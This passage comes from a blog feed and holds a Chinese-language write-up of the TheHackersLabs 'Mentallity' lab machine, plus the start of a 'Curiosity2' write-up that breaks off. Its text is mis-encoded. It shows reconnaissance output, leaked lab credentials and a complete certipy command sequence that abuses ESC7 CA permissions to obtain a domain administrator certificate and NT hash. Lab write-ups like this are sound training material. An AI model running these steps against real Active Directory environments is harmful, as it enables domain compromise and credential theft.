2025-07-23 20:49 CST\nNmap scan report for 192.168.56.28\nHost is up (0.00046s latency).\n\nPORT      STATE SERVICE       VERSION\n21/tcp    open  ftp           Microsoft ftpd\n| ftp-syst:\n|_  SYST: Windows_NT\n|_ssl-date: 2025-07-23T12:50:56+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=VulnFTP\n| Subject Alternative Name: DNS:VulnFTP\n| Not valid before: 2025-07-17T09:01:44\n|_Not valid after:  2026-07-17T09:21:44\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n| http-methods:\n|_  Potentially risky methods: TRACE\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-23 12:50:06Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n|_ssl-date: TLS randomness does not represent time                                                                                                                                              \n445/tcp   open  microsoft-ds?                                                                                                                                                                   \n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n|_ssl-date: TLS randomness does not represent time\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: mentality.thl0., Site: Default-First-Site-Name)\n|_ssl-date: TLS randomness does not represent time\n| ssl-cert: Subject: commonName=WIN-9FQTT7GPAVK.mentality.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-9FQTT7GPAVK.mentality.thl\n| Not valid before: 2025-07-17T13:49:22\n|_Not valid after:  2026-07-17T13:49:22\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n8080/tcp  open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Mentality \\xC2\\xB7 Innovating Beyond Limits\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\nMAC Address: 08:00:27:C2:70:8B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2022 (99%), Microsoft Windows Server 2016 or Server 2019 (97%), Microsoft Windows 10 1703 or Windows 11 21H2 (97%), Microsoft Windows 11 21H2 (96%), Windows Server 2019 (96%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 1703 (94%), Microsoft Windows 10 1507 - 1607 (94%), Microsoft Windows Server 2012 or 2012 R2 (94%), Microsoft Windows Server 2012 R2 Update 1 (94%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 1 hop\nService Info: Host: WIN-9FQTT7GPAVK; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-07-23T12:50:48\n|_  start_date: N/A\n|_nbstat: NetBIOS name: WIN-9FQTT7GPAVK, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:c2:70:8b (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.46 ms 192.168.56.28\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 70.86 seconds\n```\n\n### æšä¸¾æµ‹è¯•\n\n`SMB` åŒ¿åè´¦æˆ·æµ‹è¯•\n\n```bash\nâœ  Mentallity nxc smb 192.168.56.28 -u anonymous -p '' --smb-timeout 9999\nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [-] mentality.thl\\anonymous: STATUS_LOGON_FAILURE\n```\n\nFTP åŒ¿åæµ‹è¯•\n\n```bash\nâœ  Mentallity ftp 192.168.56.28                      \nConnected to 192.168.56.28.\n220 Microsoft FTP Service\nName (192.168.56.28:root): anonymous\n331 Password required\nPassword: \n530 User cannot log in.\nftp: Login failed\n```\n\n### HTTP\n\nHTTP - 80\n\n![image.png](/post-images/TheHackersLabsMentallity/image1.png)\n\n```bash\nâœ  Mentallity feroxbuster --url http://192.168.56.28 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x asp,php,txt,zip\n\n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher ğŸ¤“                 ver: 2.11.0\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http://192.168.56.28\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ true\n ğŸ’²  Extensions            â”‚ [asp, php, txt, zip]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      334l     2089w   180418c http://192.168.56.28/iisstart.png\n200      GET       32l       55w      703c http://192.168.56.28/\n[####################] - 2m   1038160/1038160 0s      found:2       errors:0\n[####################] - 2m   1038145/1038145 10180/s http://192.168.56.28/\n```\n\nHTTP - 8080\n\n![image.png](/post-images/TheHackersLabsMentallity/image2.png)\n\nå‘ç°ä¸€ä¸ªç™»å½•é¡µé¢\n\n![image.png](/post-images/TheHackersLabsMentallity/image3.png)\n\næˆ‘ä»¬ç‚¹å‡»ç™»å½•çš„æ—¶å€™å‘ç°å¾ˆå¥‡æ€ªï¼Œå› ä¸ºå¹¶æ²¡æœ‰æäº¤æ•°æ®\n\nç„¶åå¯ä»¥æ³¨æ„åˆ°åªåŠ è½½äº†ä¸€ä¸ª `JS` è„šæœ¬\n\n![image.png](/post-images/TheHackersLabsMentallity/image4.png)\n\nè„šæœ¬å†…å®¹\n\n```bash\nfunction validateForm() {\n    const u = document.getElementById(\"username\").value;\n    const p = document.getElementById(\"password\").value;\n    const errorMessage = document.getElementById(\"errorMessage\");\n\n    if (u === \"admin\" && p === \"adminpass123\") {\n        window.location.href = \"dashboard.html\";\n        return false;\n    }\n    errorMessage.textContent = \"Invalid Username Or Password!\";\n    return false;\n}\n```\n\næˆ‘ä»¬ç›´æ¥è½¬åˆ° `ashboard.html`\n\n![image.png](/post-images/TheHackersLabsMentallity/image5.png)\n\nå¾—åˆ°ä¸€ä¸² `BASE64` ç¼–ç åçš„å­—ç¬¦ä¸²ï¼Œè§£å¯†åå¾—åˆ° `FTP`çš„è´¦æˆ·\n\n![image.png](/post-images/TheHackersLabsMentallity/image6.png)\n\nå‘ç°é‡Œé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶\n\n```bash\nâœ  Mentallity ftp 192.168.56.28\nConnected to 192.168.56.28.\n220 Microsoft FTP Service\nName (192.168.56.28:root): ftpuser \n331 Password required\nPassword: \n230 User logged in.\nRemote system type is Windows_NT.\nftp> ls\n229 Entering Extended Passive Mode (|||54349|)\n125 Data connection already open; Transfer starting.\n07-17-25  08:52AM              1608612 ad_hc_mentality_htl.html\n07-17-25  05:48AM                   34 flag.txt\n07-17-25  12:13AM                   75 web.config\n226 Transfer complete.\nftp> \n```\n\nå…¶ä¸­è¿™ä¸ªå°±æ˜¯ `user.txt`\n\n```bash\nâœ  Mentallity cat flag.txt      \nFLAG{thisxxxxxxxxxxxxxxxxxxxxxx\n```\n\nå¦å¤–ä¸€ä¸ª `HTML` æ–‡ä»¶æ˜¯å®‰å…¨åˆ†æç»“æœï¼Œæ˜¯å…³äºåŸŸçš„\n\n![image.png](/post-images/TheHackersLabsMentallity/image7.png)\n\nåœ¨æŠ¥å‘Šä¸­èƒ½å¾—åˆ°ä¸€ä¸ªå‡­æ® `svcapp1`:`Hola1234$` ï¼Œå¹¶ä¸”ä¹ŸçŸ¥é“äº† `ftpuser` ä¹Ÿæ˜¯å¯ä»¥åœ¨åŸŸä¸­è¿›è¡Œè®¤è¯çš„\n\n![image.png](/post-images/TheHackersLabsMentallity/image8.png)\n\næµ‹è¯•å‡­æ®\n\n```bash\nâœ  Mentallity nxc smb 192.168.56.28 -u 'svcapp1' -p 'Hola1234$' --smb-timeout 9999                  \nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.28   445    WIN-9FQTT7GPAVK  [+] mentality.thl\\svcapp1:Hola1234$\n\nâœ  Mentallity nxc ldap 192.168.56.28 -u 'svcapp1' -p 'Hola1234$'               \nLDAP        192.168.56.28   389    WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl)\nLDAPS       192.168.56.28   636    WIN-9FQTT7GPAVK  [+] mentality.thl\\svcapp1:Hola1234$\n \nâœ  Mentallity nxc winrm 192.168.56.28 -u 'svcapp1' -p 'Hola1234$'\nWINRM       192.168.56.28   5985   WIN-9FQTT7GPAVK  [*] Windows 11 / Server 2025 Build 26100 (name:WIN-9FQTT7GPAVK) (domain:mentality.thl)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.28   5985   WIN-9FQTT7GPAVK  [-] mentality.thl\\svcapp1:Hola1234$ \n```\n\n`SMB` æ–‡ä»¶åˆ—è¡¨\n\n```bash\nâœ  192.168.56.28 tree\n.\nâ””â”€â”€ SYSVOL\n    â””â”€â”€ mentality.thl\n        â””â”€â”€ Policies\n            â”œâ”€â”€ {31B2F340-016D-11D2-945F-00C04FB984F9}\n            â”‚   â”œâ”€â”€ GPT.INI\n            â”‚   â””â”€â”€ MACHINE\n            â”‚       â”œâ”€â”€ Microsoft\n            â”‚       â”‚   â””â”€â”€ Windows NT\n            â”‚       â”‚       â””â”€â”€ SecEdit\n            â”‚       â”‚           â””â”€â”€ GptTmpl.inf\n            â”‚       â””â”€â”€ Registry.pol\n            â””â”€â”€ {6AC1786C-016F-11D2-945F-00C04fB984F9}\n                â”œâ”€â”€ GPT.INI\n                â””â”€â”€ MACHINE\n                    â””â”€â”€ Microsoft\n                        â””â”€â”€ Windows NT\n                            â””â”€â”€ SecEdit\n                                â””â”€â”€ GptTmpl.inf\n```\n\n## åŸŸåˆ†æ\n\næ”¶é›†ä¿¡æ¯\n\n```bash\nâœ  Mentallity bloodhound-python -d 'mentality.thl' -ns 192.168.56.28 --zip -c All -dc 'WIN-9FQTT7GPAVK.mentality.thl' -u svcapp1 -p 'Hola1234$'                                                \nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: mentality.thl\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: WIN-9FQTT7GPAVK.mentality.thl\nWARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: WIN-9FQTT7GPAVK.mentality.thl\nWARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...\nINFO: Found 6 users\nINFO: Found 55 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: WIN-9FQTT7GPAVK.mentality.thl\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250723214935_bloodhound.zip\n```\n\nç”¨æˆ·ç»„\n\n![image.png](/post-images/TheHackersLabsMentallity/image9.png)\n\nç¿»äº†åŠå¤©å¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„\n\n## ESC 7\n\nä½¿ç”¨ `certipy-ad` æšä¸¾ä¸€ä¸‹è¯ä¹¦æ¼æ´\n\n```bash\nâœ  Mentallity certipy-ad -debug find -dc-ip 192.168.56.28 -u svcapp1 -p Hola1234$ -vulnerable -text -target WIN-9FQTT7GPAVK.mentality.thl  \n```\n\nå‘ç° `ESC 7`\n\n```bash\nâœ  Mentallity cat 20250723221243_Certipy.txt \nCertificate Authorities\n  0\n    CA Name                             : mentality-WIN-9FQTT7GPAVK-CA\n    DNS Name                            : WIN-9FQTT7GPAVK.mentality.thl\n    Certificate Subject                 : CN=mentality-WIN-9FQTT7GPAVK-CA, DC=mentality, DC=thl\n    Certificate Serial Number           : 52F256456C27B2834A8DCCF7EE745646\n    Certificate Validity Start          : 2025-07-17 13:46:02+00:00\n    Certificate Validity End            : 2045-07-17 13:56:02+00:00\n    Web Enrollment\n      HTTP\n        Enabled                         : False\n      HTTPS\n        Enabled                         : False\n    User Specified SAN                  : Disabled\n    Request Disposition                 : Issue\n    Enforce Encryption for Requests     : Enabled\n    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy\n    Permissions\n      Owner                             : MENTALITY.THL\\Administrators\n      Access Rights\n        Enroll                          : MENTALITY.THL\\Authenticated Users\n                                          MENTALITY.THL\\svcapp1\n        ManageCa                        : MENTALITY.THL\\svcapp1\n                                          MENTALITY.THL\\Domain Admins\n                                          MENTALITY.THL\\Enterprise Admins\n                                          MENTALITY.THL\\Administrators\n        ManageCertificates              : MENTALITY.THL\\Domain Admins\n                                          MENTALITY.THL\\Enterprise Admins\n                                          MENTALITY.THL\\Administrators\n    [+] User Enrollable Principals      : MENTALITY.THL\\Authenticated Users\n                                          MENTALITY.THL\\svcapp1\n    [+] User ACL Principals             : MENTALITY.THL\\svcapp1\n    [!] Vulnerabilities\n      ESC7                              : User has dangerous permissions.\nCertificate Templates                   : [!] Could not find any certificate templates\n```\n\nè·Ÿç€æ–‡æ¡£æ‰“å³å¯\n\næ–‡æ¡£é“¾æ¥ï¼šhttps://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc7-dangerous-permissions-on-ca\n\n```bash\nâœ  Mentallity certipy-ad ca \\\n    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \\\n    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \\\n    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -add-officer 'svcapp1'\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Successfully added officer 'svcapp1' on 'mentality-WIN-9FQTT7GPAVK-CA'\n```\n\n```bash\nâœ  Mentallity certipy ca \\\n    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \\\n    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \\\n    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -enable-template 'SubCA'\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Successfully enabled 'SubCA' on 'mentality-WIN-9FQTT7GPAVK-CA'\n```\n\n```bash\nâœ  Mentallity certipy req \\\n    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \\\n    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \\\n    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -template 'SubCA' \\\n    -upn 'administrator@mentality.thl' -sid 'S-1-5-21-1896710242-59548724-504912181-500'\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Requesting certificate via RPC\n[*] Request ID is 5\n[-] Got error while requesting certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.\nWould you like to save the private key? (y/N): y\n[*] Saving private key to '5.key'\n[*] Wrote private key to '5.key'\n[-] Failed to request certificate\n```\n\n```bash\nâœ  Mentallity certipy ca \\\n    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \\\n    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \\\n    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -issue-request '5'\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Successfully issued certificate request ID 5\n```\n\n```bash\nâœ  Mentallity certipy req \\\n    -u 'svcapp1@mentality.thl' -p 'Hola1234$' \\\n    -ns '192.168.56.28' -target 'WIN-9FQTT7GPAVK.mentality.thl' \\\n    -ca 'mentality-WIN-9FQTT7GPAVK-CA' -retrieve '5'\nCertipy v5.0.3 - by Oliver Lyak (ly4k)\n\n[*] Retrieving certificate with ID 5\n[*] Successfully retrieved certificate\n[*] Got certificate with UPN 'administrator@mentality.thl'\n[*] Certificate object SID is 'S-1-5-21-1896710242-59548724-504912181-500'\n[*] Loaded private key from '5.key'\n[*] Saving certificate and private key to 'administrator.pfx'\n[*] Wrote certificate and private key to 'administrator.pfx'\n```\n\nè·å– `HASH`\n\n```bash\nâœ  Mentallity certipy-ad auth -pfx 'administrator.pfx' -domain \"mentality.thl\" -dc-ip 192.168.56.28\nCertipy v5.0.2 - by Oliver Lyak (ly4k)\n\n[*] Certificate identities:\n[*]     SAN UPN: 'administrator@mentality.thl'\n[*]     SAN URL SID: 'S-1-5-21-1896710242-59548724-504912181-500'\n[*]     Security Extension SID: 'S-1-5-21-1896710242-59548724-504912181-500'\n[*] Using principal: 'administrator@mentality.thl'\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saving credential cache to 'administrator.ccache'\n[*] Wrote credential cache to 'administrator.ccache'\n[*] Trying to retrieve NT hash for 'administrator'\n[*] Got hash for 'administrator@mentality.thl': aad3b435b51404xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxd04a6bd959f95ce2b2\n```\n\nè¯»å– `root.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> cat root_flag.txt\n4042xxxxxxxxxxxxxxxxxxxxxx\n```\n\n## æ€»ç»“\n\nä¸éš¾ï¼Œä½†æ˜¯å·®ä¸€ç‚¹ç‚¹å°±é¦–æ€äº†ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼\n\nå°±äº”åˆ†é’Ÿï¼ï¼",
            "url": "https://www.sunsetaction.top/2025/07/23/TheHackersLabsMentallity",
            "title": "TheHackersLabs - Mentallity",
            "summary": "Mentallity https://labs.thehackerslabs.com/machine/120 Recon PortScan namp ç«¯å£æ‰«æ è²Œä¼¼æ˜¯åŒç½‘å¡ æšä¸¾æµ‹è¯• SMB åŒ¿åè´¦æˆ·æµ‹è¯• FTP åŒ¿åæµ‹è¯• HTTP HTTP 80 HTTP 8080 å‘ç°ä¸€ä¸ªç™»å½•é¡µé¢ æˆ‘ä»¬ç‚¹å‡»ç™»å½•...",
            "date_modified": "2025-07-23T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Windows",
                "AD",
                "ESC7",
                "FTP"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity2",
            "content_html": "\n# Curiosity2\n\n> https://labs.thehackerslabs.com/machine/103\n> \n\n![image.png](/post-images/TheHackersLabsCuriosity2/image.png)\n\n## Recon\n\n### PortScan\n\n`nmap` ç«¯å£æ‰«æ\n\n```bash\nâœ  Curiosity2 nmap -sT -min-rate 10000 -p- 192.168.56.116 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:40 CST\nWarning: 192.168.56.116 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.56.116\nHost is up (0.00030s latency).\nNot shown: 64872 closed tcp ports (conn-refused), 638 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49684/tcp open  unknown\n49685/tcp open  unknown\n49689/tcp open  unknown\n49693/tcp open  unknown\n49704/tcp open  unknown\n57936/tcp open  unknown\n60031/tcp open  unknown\nMAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n```\n\n```bash\nâœ  Curiosity2 nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.116\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:41 CST\nNmap scan report for 192.168.56.116\nHost is up (0.00086s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 11:41:37Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49685/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  msrpc         Microsoft Windows RPC\n49693/tcp open  msrpc         Microsoft Windows RPC\n49704/tcp open  msrpc         Microsoft Windows RPC\n57936/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-info:\n|   192.168.56.116\\SQLEXPRESS:\n|     Instance name: SQLEXPRESS\n|     Version:\n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: false\n|     TCP port: 57936\n|_    Clustered: false\n|_ssl-date: 2025-07-19T11:42:41+00:00; 0s from scanner time.\n| ms-sql-ntlm-info:\n|   192.168.56.116\\SQLEXPRESS:\n|     Target_Name: CONS\n|     NetBIOS_Domain_Name: CONS\n|     NetBIOS_Computer_Name: WIN-C73PROQLRHL\n|     DNS_Domain_Name: cons.thl\n|     DNS_Computer_Name: WIN-C73PROQLRHL.cons.thl\n|_    Product_Version: 10.0.14393\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n60031/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-C73PROQLRHL; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-07-19T11:42:32\n|_  start_date: 2025-07-19T18:29:12\n|_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:06:86:f8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.86 ms 192.168.56.116\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 83.59 seconds\n```\n\n### æšä¸¾æµ‹è¯•\n\næµ‹è¯• `SMB` åŒ¿åè´¦æˆ·\n\n```bash\nâœ  Curiosity2 nxc smb 